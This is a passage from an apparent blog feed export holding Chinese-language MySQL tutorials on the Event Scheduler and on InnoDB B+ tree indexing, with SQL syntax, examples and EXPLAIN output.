mysql&amp;gt;? create table
</code></pre>]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> sql基础 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mysql事件调度器(Event Scheduler)]]></title>
      <url>/2014/08/19/mysql-e4-ba-8b-e4-bb-b6-e8-b0-83-e5-ba-a6-e5-99-a8event-scheduler.html</url>
      <content type="html"><![CDATA[<pre><code>Mysql中的事件调度器Event Scheduler类似于linux下的crontab计划任务的功能,它是由一个特殊的时间调度线程执行的
</code></pre><h4 id="一、查看当前是否开启了event-scheduler三种方法"><a href="#一、查看当前是否开启了event-scheduler三种方法" class="headerlink" title="一、查看当前是否开启了event scheduler三种方法"></a><span id="t1" style="font-weight: inherit; font-style: inherit;">一、查看当前是否开启了event scheduler三种方法</span></h4><p>1) SHOW VARIABLES LIKE ‘event_scheduler’;<br>2) SELECT @@event_scheduler;<br>3) SHOW PROCESSLIST;(是否有State为：Waiting for next activation的进程，User为event_scheduler)</p>
<h4 id="二、启动关闭event-scheduler方法"><a href="#二、启动关闭event-scheduler方法" class="headerlink" title="二、启动关闭event scheduler方法"></a><span id="t2" style="font-weight: inherit; font-style: inherit;">二、启动关闭event scheduler方法</span></h4><p>时间调度器是否开启由全局变量event_scheduler决定，它有三个可以设定的值： – OFF : 事件调度器是关闭的，调度线程并没有运行，并且在SHOW PROCESSLIST中不显示，默认值是OFF – ON ：事件调度器是开启的，调度线程并没有运行，并且执行所有的调度事件，通过SHOW PROCESSLIST可以查看Waiting for next activation的进程 – DISABLED : 设定这个值表示Event Scheduler是被禁止的，无法在Mysql运行状态下改变其值</p>
<p><strong>注：</strong>在Mysql启动时如果在my.cnf设置了event_scheduler=ON（OFF or 1 or 0）时，就不能在运行时修改撑DISABLED，如果设置event_scheduler=DISABLED时，就不能在运行时修改其值为ON （ OFF or 1 or 0）</p>
<pre><code>mysql&amp;gt; SELECT @@event_scheduler;
+-------------------+
| @@event_scheduler |
+-------------------+
| DISABLED |
+-------------------+
1 row in set (0.00 sec)
mysql&amp;gt; SET @@global.event_scheduler = 1; 
ERROR 1290 (HY000): The MySQL server is running with the --event-scheduler=DISABLED or --skip-grant-tables option so it cannot execute this statement

在mysql运行时开启Event（4种方法均可）：
SET GLOBAL event_scheduler = ON;
SET @@global.event_scheduler = ON;
SET GLOBAL event_scheduler = 1;
SET @@global.event_scheduler = 1;

在mysql运行时关闭Event（4种方法均可）：
SET GLOBAL event_scheduler = OFF;
SET @@global.event_scheduler = OFF;
SET GLOBAL event_scheduler = 0;
SET @@global.event_scheduler = 0;
`&lt;/pre&gt;

#### &lt;span id=&quot;t3&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;三、创建Event&lt;/span&gt;

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`语法：
CREATE
    [DEFINER = { user | CURRENT_USER }]
    EVENT
    [IF NOT EXISTS]
    event_name
    ON SCHEDULE schedule
    [ON COMPLETION [NOT] PRESERVE]
    [ENABLE | DISABLE | DISABLE ON SLAVE]
    [COMMENT &apos;comment&apos;]
    DO event_body;

schedule:
    AT timestamp [+ INTERVAL interval] ...
  | EVERY interval
    [STARTS timestamp [+ INTERVAL interval] ...]
    [ENDS timestamp [+ INTERVAL interval] ...]
interval:
    quantity {YEAR | QUARTER | MONTH | DAY | HOUR | MINUTE |
             WEEK | SECOND | YEAR_MONTH | DAY_HOUR | DAY_MINUTE |
             DAY_SECOND | HOUR_MINUTE | HOUR_SECOND | MINUTE_SECOND}
`&lt;/pre&gt;

**说明：**

  DEFINER默认是CREATE EVENT的用户,可以理解为DEFINER=CURRENT_USER,指该event的用户，服务器在执行该事件时，使用该用户来检查权限；如果设置语法:‘user_name’@‘host_name’，如果当前CREATE EVENT用户没有supser权限，则无法将该event指派给其他用户；如果有super权限，则可以指定任意存在的用户，若不存在，时间执行时报错
IF NOT EXISTS ： 如果在同一个schema创建一个已经存在的event_name时不会做任何操作，也不会出错，但会出现warings：该event已经存在；如果不增加此关键词已经存在的话提示ERROR： 1537 (HY000): Event ‘countsum’ already exists
ON SCHEDULE ：用于设置什么时间执行，执行的频率及执行多久的问题
AT timestamp ：表示在给定的datetime或者timestamp的时间执行一次
+ INTERVAL interval：表示从AT timestamp多久之后执行
EVERY interval ：有规律的重复执行
[ENABLE | DISABLE]可是设置该事件创建后状态是否开启或关闭，默认为ENABLE
[COMMENT ‘comment’]可以给该事件加上注释。

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`event创建时间的3周2天后：
AT  CURRENT_TIMESTAMP + INTERVAL 3 WEEK + INTERVAL 2 DAY

2分钟10秒： 
+ INTERVAL &apos;2:10&apos; MINUTE_SECOND

每6周：
EVERY 6 WEEK

从现在开始30分钟后每12小时执行一次到从现在到4周后结束执行：
EVERY 12 HOUR STARTS CURRENT_TIMESTAMP + INTERVAL 30 MINUTE ENDS CURRENT_TIMESTAMP + INTERVAL 4 WEEK 
`&lt;/pre&gt;

**实例：**
前提：创建EVENT的用户需要只少对应schema的EVENT权限
最基本的create event只需要三个部分：
1\. create event关键字以及一个event名称
2\. on schedule子句
3\. do子句

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`1\. 在创建事件myevent1小时后执行，执行一条更新

CREATE EVENT myevent
    ON SCHEDULE AT CURRENT_TIMESTAMP + INTERVAL 1 HOUR
DO
  UPDATE myschema.mytable SET mycol = mycol + 1;

2.2014年3月20日12点整清空test表：

CREATE EVENT e_test
    ON SCHEDULE AT TIMESTAMP &apos;2014-03-20 12:00:00&apos;
    DO TRUNCATE TABLE test.aaa;

3.5天后开启每天定时清空test表：

CREATE EVENT e_test
    ON SCHEDULE EVERY 1 DAY
    STARTS CURRENT_TIMESTAMP + INTERVAL 5 DAY
    DO TRUNCATE TABLE test.aaa;

4.每天定时清空test表，5天后停止执行

CREATE EVENT e_test
    ON SCHEDULE EVERY 1 DAY
    ENDS CURRENT_TIMESTAMP + INTERVAL 5 DAY
    DO TRUNCATE TABLE test.aaa;

5.5天后开启每天定时清空test表，一个月后停止执行：

CREATE EVENT e_test
    ON SCHEDULE EVERY 1 DAY
    STARTS CURRENT_TIMESTAMP + INTERVAL 5 DAY
    ENDS CURRENT_TIMESTAMP + INTERVAL 1 MONTH
    DO TRUNCATE TABLE test.aaa;

6.每天定时清空test表(只执行一次，任务完成后就终止该事件)：

CREATE EVENT e_test
    ON SCHEDULE EVERY 1 DAY
    ON COMPLETION NOT PRESERVE
    DO TRUNCATE TABLE test.aaa;

[ON COMPLETION [NOT] PRESERVE]可以设置这个事件是执行一次还是持久执行，默认为NOT PRESERVE。
`&lt;/pre&gt;

#### &lt;span id=&quot;t4&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;四、修改Event&lt;/span&gt;

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`ALTER
   [DEFINER = { user | CURRENT_USER }]
   EVENT event_name
   [ON SCHEDULE schedule]
   [ON COMPLETION [NOT] PRESERVE]
   [RENAME TO new_event_name]
   [ENABLE | DISABLE | DISABLE ON SLAVE]
   [COMMENT &apos;comment&apos;]
   [DO event_body]
`&lt;/pre&gt;

**说明：**
对于任何一个拥有定义在database里面事件的event权限的用户都可以修改event，并且成功需改后，那个用户就会成为此event的definer

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`实例：
CREATE EVENT myevent
    ON SCHEDULE
      EVERY 6 HOUR
    COMMENT &apos;A sample comment.&apos;
    DO
      UPDATE myschema.mytable SET mycol = mycol + 1;

将上面的event从开始之后每6个小时执行一次改为从开始4个小时后每12小时执行一次

只修改schedule
ALTER EVENT myevent
    ON SCHEDULE
      EVERY 12 HOUR
    STARTS CURRENT_TIMESTAMP + INTERVAL 4 HOUR;
同时修改schedule和body
ALTER EVENT myevent
    ON SCHEDULE
      AT CURRENT_TIMESTAMP + INTERVAL 1 DAY
    DO
      TRUNCATE TABLE myschema.mytable;
`&lt;/pre&gt;

关闭、启动、别名、移动、删除event：

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`临时关闭某个event
ALTER EVENT myevent DISABLE;

开启某个event
ALTER EVENT myevent ENABLE;

别名某个event
ALTER EVENT olddb.myevent
RENAME TO newdb.myevent;

将myevent从olddb库移动到newdb库
ALTER EVENT olddb.myevent
RENAME TO newdb.myevent;

删除event
DROP EVENT [IF EXISTS] event_name
</code></pre><h4 id="五、查询Event信息"><a href="#五、查询Event信息" class="headerlink" title="五、查询Event信息"></a><span id="t5" style="font-weight: inherit; font-style: inherit;">五、查询Event信息</span></h4><p>Event信息相关表：<br>information_schema.events<br>mysql.event</p>
<p>查看事件的创建信息<br>show create event countsum \G</p>
<p>查看sem库的events信息<br>USE sem；<br>SHOW EVENTS \G</p>
<p>SHOW EVENTS FROM sem;</p>
<p><strong>参考资料</strong>:<a href="https://dev.mysql.com/doc/refman/5.5/en/events.html" target="_blank" rel="external">https://dev.mysql.com/doc/refman/5.5/en/events.html</a></p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Innodb索引原理和B+树]]></title>
      <url>/2014/08/19/innodb-e7-b4-a2-e5-bc-95-e5-8e-9f-e7-90-86-e5-92-8cb-e6-a0-91.html</url>
      <content type="html"><![CDATA[<h4 id="一、innodb存储引擎索引概述"><a href="#一、innodb存储引擎索引概述" class="headerlink" title="一、innodb存储引擎索引概述"></a><span id="t1" style="font-weight: inherit; font-style: inherit;">一、innodb存储引擎索引概述</span></h4><pre><code>innodb存储引擎支持两种常见的索引：B+树索引和哈希索引。
</code></pre><p>innodb支持哈希索引是自适应的，innodb会根据表的使用情况自动生成哈希索引<br>B+树索引就是传统意义上的索引，是关系型数据库中最常用最有效的索引。B+树是从最早的平衡二叉树演变而来，但是B+树不是一个二叉树。B+中的B不代表二叉(Binary),而是代表平衡(Balance)</p>
<p><strong>注意</strong>：B+树索引并不能找到一个键值对应的具体行。b+树索引只能查到被查找数据行所在的页，然后数据库通过把页读入内存，再在内存中查找，最后得到结果</p>
<h4 id="二、理解B-树算法"><a href="#二、理解B-树算法" class="headerlink" title="二、理解B+树算法"></a><span id="t2" style="font-weight: inherit; font-style: inherit;">二、理解B+树算法</span></h4><pre><code>B+树是为磁盘及其他存储辅助设备而设计一种平衡查找树（不是二叉树）。B+树中，所有记录的节点按大小顺序存放在同一层的叶节点中，各叶节点用指针进行连接。
</code></pre><p>下面演示一个B+数结构，高度为2，每页可放4条记录，扇出(fan out)为5。从下图1可以看出，所有记录都在页节点中，并且为顺序存放，我们从最左边的叶节点开始遍历，可以得到所有键值的顺序排序：5、10、15、20、25、30、50、55、60、65、75、80、85、90</p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/1.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/1.png" alt="1"></a></p>
<p><span id="t3" style="color: #222222;">（1） B+树的插入操作</span><span style="color: #222222;"> B+树的插入必须保证插入后叶节点的记录依然排序。同时要考虑插入B+树的三种情况，每种情况都可能导致不同的插入算法。如下表所示：</span></p>
<p><a href="http://www.simlinux.com/wp-content/uploads/2014/08/2.png"><img src="http://www.simlinux.com/wp-content/uploads/2014/08/2.png" alt="2"></a></p>
<p>   我们实例分析B+树的插入，在图1的B+树中，我们需要插入28这个值。因为Leaf Page和Index page都没有满，我们直接将记录插入叶节点就可以了。如下图2所示：</p>
<p><img src="http://simlinux.com/images/mysql/3.png" alt=""><br>图2 插入键值28<br>下面我们再插入70这个值，这时Leaf Page已经满了，但是Index Page还没有满，符合上面的第二种情况。这时插入Leaf Page的情况为 50、55、60、65、70.我们根据中间的值60拆分叶节点，可得到下图3所示（双项链表指针依然存在，没有画出） <img src="http://simlinux.com/images/mysql/4.png" alt=""><br>图3 插入键值70<br>最后我们再插入95，这个Leaf Page和Index Page都满了，符合上面第三种情况。需要做2次拆分，如下图4所示：<br><img src="http://simlinux.com/images/mysql/5.png" alt=""><br>图4 插入键值95<br>可以看到，不管怎么变化，B+树总会保持平衡。但是为了保持平衡，对于新插入的键值可能需要做大量的拆分页操作。B+树主要用于磁盘，拆分意味着磁盘的操作，应该在可能的情况下尽量减少页的拆分。因此，B+树提供了旋转功能。旋转发生在Leaf Page已经满了，但是左右兄弟节点没有满的情况下。这时B+树并不是急着做页的拆分，而是旋转。旋转结果如图5所示，可以看到旋转操作使B+树减少了一次页的拆分操作，高度仍然为2.<br><img src="http://simlinux.com/images/mysql/6.png" alt="">                 图5 B+树的旋转操作</p>
<p><span id="t4" style="font-weight: inherit; font-style: inherit;">(2) B+树的删除操作</span> B+树使用填充因子来控制数的删除变化。填充因子可以设置的最小值为50%。B+树的删除操作同样保证删除后叶节点的记录依然排序。 根据填充因子的变化，B+树删除依然需要考虑三种情况，如下表所示：<br><img src="http://simlinux.com/images/mysql/7.png" alt=""></p>
<p>根据图4的B+树，我们进行删除操作，首先删除键值为70的这条记录，该记录符合上表第一种情况，删除后如下图6所示： <img src="http://simlinux.com/images/mysql/8.png" alt="">                 图6 删除键值70</p>
<p>接着我们删除键值为25的记录，这也是属于上表第一种情况，不同的是该值还是index page中的值。因此在删除Leaf Page中的25后，还需要将25的右兄弟节点28更新到Index Page中，如下图7所示（图中有两个笔误，红色为修正值）：<br><img src="http://simlinux.com/images/mysql/9.png" alt="">                 图7 删除键值28<br>最后我们删除键值为60的记录。删除Leaf page键值为60的记录后，其填充因子小于50%。需要做合并操作。同样在删除Index page中相关记录后需要做Index Page的合并操作。</p>
<h4 id="三、B-树索引介绍"><a href="#三、B-树索引介绍" class="headerlink" title="三、B+树索引介绍"></a><span id="t5" style="font-weight: inherit; font-style: inherit;">三、B+树索引介绍</span></h4><p>B+树索引的本质是B+树在数据库中的实现。但是B+树索引有一个特点是高扇出性，因此在数据库中，B+树的高度一般在2到3层。也就是说查找某一键值的记录，最多只需要2到3次IO开销。按磁盘每秒100次IO来计算，查询时间只需0.0.2到0.03秒。</p>
<p>数据库中B+树索引分为聚集索引（clustered index）和非聚集索引（secondary index）.这两种索引的共同点是内部都是B+树，高度都是平衡的，叶节点存放着所有数据。不同点是叶节点是否存放着一整行数据。</p>
<p><span id="t6" style="font-weight: inherit; font-style: inherit;">(1) 聚集索引</span><br>Innodb存储引擎表是索引组织表，即表中数据按主键顺序存放。而聚集索引就是按每张表的主键构造一颗B+树。并且叶节点存放整张表的行记录数据。每张表只能有一个聚集索引（一个主键）。<br>聚集索引的另一个好处是它对于主键的排序查找和范围的速度非常快。叶节点的数据就是我们要找的数据。</p>
<pre><code>主键排序查找：例如我们要找出最新的10条团购订单，由于B+树是双项链表，我们可以迅速找到最后一个页，并取出10条记录，我们用Explain进行分析：
12:41:32 tuangou&amp;gt; explain select * from groupon_so order by id desc limit 10\G
id: 1
select_type: SIMPLE
    table: groupon_so
     type: index
     possible_keys: NULL
      key: PRIMARY
  key_len: 8
      ref: NULL
     rows: 10
    Extra: 

1 row in set (0.00 sec)

主键范围查找：如果要通过主键查找某一范围内的数据，通过叶节点的上层中间节点就能得到页的范围，之后直接读取数据页即可：
12:50:19 tuangou&amp;gt; explain select * from groupon_so where id&amp;gt;10000000 and id&amp;lt;12000000\G
       id: 1
select_type: SIMPLE
    table: groupon_so
     type: range
     possible_keys: PRIMARY
      key: PRIMARY
  key_len: 8
      ref: NULL
     rows: 4301486
    Extra: Using where
1 row in set (0.00 sec)
`&lt;/pre&gt;

&lt;span id=&quot;t7&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;(2) 辅助索引&lt;/span&gt;
辅助索引（也称非聚集索引）。叶级别不包含行的全部数据，叶级别除了包含行的键值以外，每个索引行还包含了一个书签（bookmark），该书签告诉innodb存储引擎，哪里可以找到与索引对应的数据。
辅助索引的存在并不影响数据再聚集索引中的组织，因此一个表可以有多个辅助索引。当通过辅助索引查找数据时，innodb会遍历辅助索引并通过叶级别的指针获得指向主键索引的主键。然后再通过主键索引找到一行完整的数据。

&lt;span id=&quot;t8&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;(3) B+树索引的管理&lt;/span&gt;
索引的创建和删除可以用两种方式。一种是alter table,另一种是create/drop index

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`alter table 创建和删除索引的语法为：
ALTER [ONLINE | OFFLINE] [IGNORE] TABLE tbl_name
| ADD {INDEX|KEY} [index_name]
    [index_type] (index_col_name,…) [index_option] …

ALTER [ONLINE | OFFLINE] [IGNORE] TABLE tbl_name
| DROP PRIMARY KEY
| DROP {INDEX|KEY} index_name

create/drop index的语法为：
CREATE [ONLINE|OFFLINE] [UNIQUE|FULLTEXT|SPATIAL] INDEX index_name
[index_type]
ON tbl_name (index_col_name,…)

DROP [ONLINE|OFFLINE] INDEX index_name ON tbl_name
`&lt;/pre&gt;

MySQL索引注意的问题：对于MySQL索引的添加和删除操作，MySQL先是创建一张加好索引的临时表，然后把数据导入临时表，再删除原表，把临时表重命名为原表。
Innodb存储引擎从Innodb Plugin版本开始，支持一种快速创建索引的方法（只限于辅助索引，主键索引仍需要建临时表）。首先对表加S锁，在创建的过程中不需要重建表，但是由于上了S锁，在创建索引的过程中只能进行查询操作，不能更新数据。

#### &lt;span id=&quot;t9&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;四、B+树索引的使用&lt;/span&gt;

(1).什么时候使用B+索引

当查询表中很少一部分数据时，B+索引才有意义。对于性别，地区类型字段，他们取值范围很小，即低选择性。这时加B+索引是没有必要的。相反，某个字段取值范围很广，如姓名，几乎没有重复，即高选择性，则使用B+索引是比较合适的。因此。当访问高选择性字段并取出很少一部分数据时，该字段加B+索引是非常有效的。但是当取出的数据行占表中大部分数据时，数据库就不会使用B+索引了。

举例说明下，看下面这个团购订单表groupon_so的部分索引：

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`    14:08:34 tuangou&amp;gt; show index from groupon_so\G
*************************** 1\. row ***************************
Table: groupon_so
Non_unique: 0
 Key_name: PRIMARY
 Seq_in_index: 1
 Column_name: id
 Collation: A
 Cardinality: 10088342
 Sub_part: NULL
   Packed: NULL
     Null: 
Index_type: BTREE
  Comment: 
Index_comment: 
*************************** 2\. row ***************************
Table: groupon_so
Non_unique: 1
Key_name: idx_groupon_so_order_id
Seq_in_index: 1
Column_name: order_id
Collation: A
Cardinality: 10088342
Sub_part: NULL
   Packed: NULL
     Null: 
Index_type: BTREE
  Comment: 
Index_comment: 
*************************** 3\. row ***************************
Table: groupon_so
Non_unique: 1
 Key_name: idx_groupon_so_order_code
 Seq_in_index: 1
 Column_name: order_code
 Collation: A
 Cardinality: 10088342
 Sub_part: NULL
   Packed: NULL
   Null: 
Index_type: BTREE
   Comment: 
Index_comment: 
*************************** 4\. row ***************************
    Table: groupon_so
    Non_unique: 1
 Key_name: idx_groupon_so_end_user_id
 Seq_in_index: 1
 Column_name: end_user_id
 Collation: A
 Cardinality: 10088342
 Sub_part: NULL
   Packed: NULL
   Null: YES
Index_type: BTREE
   Comment: 
Index_comment: 
*************************** 5\. row ***************************
Table: groupon_so
Non_unique: 1
Key_name: idx_groupon_so_groupon_id
Seq_in_index: 1
Column_name: groupon_id
Collation: A
Cardinality: 148357
Sub_part: NULL
Packed: NULL
  Null: 
Index_type: BTREE
   Comment: 
Index_comment:

其中有一个索引 idx_groupon_so_order_id,这个索引里面字段订单号的值都是不重复的，是高选择性的字段。
我们查找order_id为 99165590 的这条记录，执行计划如下：

14:31:50 tuangou&amp;gt; explain select * from groupon_so where order_id=99165590\G
*************************** 1\. row ***************************
       id: 1
    select_type: SIMPLE
    table: groupon_so
     type: ref
possible_keys: idx_groupon_so_order_id
      key: idx_groupon_so_order_id
  key_len: 8
      ref: const
     rows: 1
    Extra: 
1 row in set (0.00 sec)
可以看到使用了idx_groupon_so_order_id这个索引，符合高选择性，取少部分数据这个特性。

但是如果执行下面这条语句：
14:32:33 tuangou&amp;gt; explain select * from groupon_so where order_id&amp;gt;99165590\G
*************************** 1\. row ***************************
       id: 1
    select_type: SIMPLE
    table: groupon_so
    type: ALL
possible_keys: idx_groupon_so_order_id
    key: NULL
key_len: NULL
    ref: NULL
   rows: 10092839
  Extra: Using where
1 row in set (0.00 sec)

可以看到possible_keys依然是idx_groupon_so_order_code，但是索引优化使用的索引keys显示的是NULL，因为虽然这个字段是高选择性的，但是我们取出了表中的大部分数据，索引没有用到索引。

14:34:11 tuangou&amp;gt; select @a:=count(id) from groupon_so where order_id&amp;gt;99165590;
+—————+
| @a:=count(id) |
+—————+
|       8684424 |
+—————+
1 row in set (2.48 sec)

14:34:26 tuangou&amp;gt; select @a:=count(id) from groupon_so;
+—————+
| @a:=count(id) |
+—————+
|       9858135 |
+—————+
1 row in set (1.86 sec)

14:37:25 tuangou&amp;gt; select 8684424/9858135;
+—————–+
| 8684424/9858135 |
+—————–+
|          0.8809 |
+—————–+
1 row in set (0.00 sec)
可以看到我们取出了表中88%的数据，索引没有用到索引。
`&lt;/pre&gt;

&lt;span id=&quot;t11&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;(2)顺序读、随机读与预读取&lt;/span&gt;
顺序读是指顺序的读取磁盘上的块，随机读是指访问的块是不连续的，需要磁盘的磁头不断移动。随机读的性能是远远低于顺序读的。
在数据库中，顺序读根据索引的叶节点就能顺序的读取所需的行数据，这个顺序读只是逻辑的顺序读，在磁盘上可能还是随机读。随机读是指访问辅助索引叶节点不能完全得到结果，需要根据辅助索引页节点中的主键去寻找实际数据行。对于一些取表里很大部分数据的查询，正式因为读取是随机读，而随机读的性能会远低于顺序读。所以优化器才会选择全部扫描顺序读，而不使用索引。
innodb存储引擎有两个预读取方法，随机预读取和线性预读取。随机预读取是指当一个区（共64个连续页）中有13个页在缓冲区中并被频繁访问时，innodb存储引擎会将这个区中剩余的页预读到缓冲区。线性预读取基于缓冲池中页的访问方式，而不是数量。如果一个区中有24个页被顺序访问了，则innodb会读取下一个区的所有页到缓冲区。但是innodb预读取经过测试后性能比较差，经过TPCC测试发现禁用预读取比启用预读取提高了10%的性能。在新版本innodb中，mysql禁用了随机预读取，仅保留了线性预读取，并且加入了innodb_read_ahead_threshold参数，当连续访问页超过该值时才启用预读取，默认值为56。

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`15:02:16 tuangou&amp;gt; show variables like ‘innodb_read_ahead_threshold%’;
+—————————–+——-+
| Variable_name               | Value |
+—————————–+——-+
| innodb_read_ahead_threshold | 56    |
+—————————–+——-+
1 row in set (0.00 sec)
`&lt;/pre&gt;

3)&lt;span id=&quot;t12&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;辅助索引的优化&lt;/span&gt;
通过前面可知，辅助索引的页节点包含主键，但是辅助索引的叶节点并不包含完整的行数据信息，因此，innodb存储引擎总是会从辅助索引的叶节点判断是否能得到数据。让我们看一个例子：

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; create table t ( a int not null, b varchar(20), primary key(a),key(b));
Query OK, 0 rows affected (0.18 sec)

mysql&amp;gt; insert into t select  1,’kangaroo’;
Query OK, 1 row affected (0.00 sec)
Records: 1  Duplicates: 0  Warnings: 0

mysql&amp;gt; insert into t select  2,’dolphin’;
Query OK, 1 row affected (0.01 sec)
Records: 1  Duplicates: 0  Warnings: 0

mysql&amp;gt; insert into t select  3,’dragon’;
Query OK, 1 row affected (0.01 sec)
Records: 1  Duplicates: 0  Warnings: 0

mysql&amp;gt; insert into t select  4,’anteloge’;
Query OK, 1 row affected (0.01 sec)
Records: 1  Duplicates: 0  Warnings: 0

如果执行select * from t很多人认为应该是如下结果：
mysql&amp;gt; select * from t order by a\G;
*************************** 1\. row ***************************
a: 1
b: kangaroo
*************************** 2\. row ***************************
a: 2
b: dolphin
*************************** 3\. row ***************************
a: 3
b: dragon
*************************** 4\. row ***************************
a: 4
b: anteloge

4 rows in set (0.00 sec)

但是实际执行结果确是：
mysql&amp;gt; select * from t\G;
*************************** 1\. row ***************************
a: 4
b: anteloge
*************************** 2\. row **************************
a: 2
b: dolphin
*************************** 3\. row ***************************
a: 3
b: dragon
*************************** 4\. row ***************************
a: 1
b: kangaroo
4 rows in set (0.00 sec)

因为辅助索引包含了主键a的值，因此访问b列上的辅助索引就可以得到a的值，这样就可以得到表中所有的数据。我们看这条语句的执行计划：
mysql&amp;gt; explain select * from t\G;
*************************** 1\. row ***************************
id: 1
select_type: SIMPLE
table: t
type: index
possible_keys: NULL         
      key: b
  key_len: 23
      ref: NULL
     rows: 4
    Extra: Using index
1 row in set (0.00 sec)

可以看到优化器最终走的索引b,如果想对a列进行排序，则需要进行order by操作：
mysql&amp;gt; explain select * from t order by a\G;
*************************** 1\. row ***************************
id: 1
select_type: SIMPLE
    table: t
     type: index
possible_keys: NULL
      key: PRIMARY
  key_len: 4
      ref: NULL
     rows: 4
    Extra: NULL
1 row in set (0.00 sec)

mysql&amp;gt; select * from t order by a\G;
*************************** 1\. row ***************************
a: 1
b: kangaroo
*************************** 2\. row ***************************
a: 2
b: dolphin
*************************** 3\. row ***************************
a: 3
b: dragon
*************************** 4\. row ***************************
a: 4
b: anteloge

或者使用主键强制得到结果：
mysql&amp;gt; select * from t force index(PRIMARY)\G;
*************************** 1\. row ***************************
a: 1
b: kangaroo
*************************** 2\. row ***************************
a: 2
b: dolphin
*************************** 3\. row ***************************
a: 3
b: dragon
*************************** 4\. row ***************************
a: 4
b: anteloge

4 rows in set (0.00 sec)
`&lt;/pre&gt;

&lt;span id=&quot;t13&quot; style=&quot;font-weight: inherit; font-style: inherit;&quot;&gt;(4)联合索引&lt;/span&gt;
联合索引是指对表上的多个列做索引，联合索引的创建方法和之前的一样，如下：

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; alter table t add key idx_a_b(a,b);
Query OK, 0 rows affected (0.17 sec)
Records: 0  Duplicates: 0  Warnings: 0
`&lt;/pre&gt;

联合索引还是一个B+树，不同的是联合索引键值的数量不是1，而是大于等于2.
下面我们讨论一个两个整形列组成的联合索引，假定两个键值的名称分别为a和b，如下图8所示，每个节点上有两个键值，(1,1),(1,2),(2,1),(2,4),(3,1),(3,2), 数据按(a,b)顺序进行排列

![](http://www.ruzuojun.com/wp-content/uploads/2013/09/8.png)

              图8 多个键值的B+树

因此，对于查询select * from t where a=xxx and b=xxx,显然可以使用(a,b)这个联合索引。对于单个a列查询 select * from t where a=xxx也是可以使用(a,b)这个索引。但是对于b列的查询select * from t where b=xxx是用不到这颗B+树索引。可以看到叶节点上b的值为1、2、1、4、1、2.显然不是排序的，因此b列的查询使用不到(a,b)索引。

联合索引的第二个好处，可以对第二键值进行排序。例如很多情况下我们需要查询某个用户的购物情况，并按照时间排序，取出最近3次的购买记录，这时使用联合索引可以避免多一次的排序操作。因为索引本身在叶节点中已经排序了。看下面示例:

&lt;pre style=&quot;color: #93a1a1;&quot;&gt;`mysql&amp;gt; create table buy_log(userid int unsigned not null, buy_date date);
Query OK, 0 rows affected (0.09 sec)

mysql&amp;gt; insert into buy_log values(1,’2013-01-01′);
Query OK, 1 row affected (0.01 sec)

mysql&amp;gt; insert into buy_log values(2,’2013-01-01′);
Query OK, 1 row affected (0.01 sec)

mysql&amp;gt; insert into buy_log values(3,’2013-01-01′);
Query OK, 1 row affected (0.01 sec)

mysql&amp;gt; insert into buy_log values(1,’2013-02-01′);
Query OK, 1 row affected (0.01 sec)

mysql&amp;gt; insert into buy_log values(3,’2013-02-01′);
Query OK, 1 row affected (0.00 sec)

mysql&amp;gt; insert into buy_log values(1,’2013-03-01′);
Query OK, 1 row affected (0.01 sec)

mysql&amp;gt; insert into buy_log values(1,’2013-04-01′);
Query OK, 1 row affected (0.01 sec)

mysql&amp;gt; alter table buy_log add key(userid);
Query OK, 0 rows affected (0.07 sec)
Records: 0  Duplicates: 0  Warnings: 0

mysql&amp;gt; alter table buy_log add key(userid,buy_date);
Query OK, 0 rows affected (0.11 sec)
Records: 0  Duplicates: 0  Warnings: 0
上面我们建立了测试表和数据，建立了2个索引来比较。两个索引都包含了userid字段。如果只对于userid查询，优化器的选择是：

mysql&amp;gt; explain select * from buy_log where userid=2\G;
*************************** 1\. row ***************************
id: 1
select_type: SIMPLE
table: buy_log
     type: ref
possible_keys: userid,userid_2
      key: userid
  key_len: 4
      ref: const
     rows: 1
    Extra: NULL
1 row in set (0.00 sec)
可以看到possible_keys里面两个索引都可以使用，分别是单个的userid索引和userid,buy_date的联合索引。但是优化器最终选择的是userid，因为该叶节点包含单个键值，因此一个页存放的记录应该更多。

接下来看以下的查询，假定要取出userid=1最近的3次购买记录，分别使用单个索引和联合索引的区别：
mysql&amp;gt; explain select * from buy_log where userid=1 order by buy_date desc limit 3\G;
*************************** 1\. row ***************************
id: 1
select_type: SIMPLE
    table: buy_log
     type: ref
possible_keys: userid,userid_2
      key: userid_2
  key_len: 4
      ref: const
     rows: 4
    Extra: Using where; Using index
1 row in set (0.00 sec)

同样对于上述SQL，两个索引都可使用，但是查询优化器使用了userid和buy_date组成的联合索引userid_2.因为这个联合索引中buy_date已经排序好了，可以减少一次排序操作。

如果我们强制使用user_id单个索引，可以看到如下情况：
mysql&amp;gt; explain select * from buy_log force index(userid) where userid=1 order by buy_date desc limit 3\G;
*************************** 1\. row ***************************
id: 1
select_type: SIMPLE
table: buy_log
     type: ref
possible_keys: userid
      key: userid
  key_len: 4
      ref: const
     rows: 4
    Extra: Using where; Using filesort
1 row in set (0.00 sec)
在Extra这里可以看到Using filesort，Using filesort指排序，但不一定是在文件中完成。
</code></pre><blockquote>
<p>本文出自<a href="http://www.ruzuojun.com/" target="_blank" rel="external">http://www.ruzuojun.com</a></p>
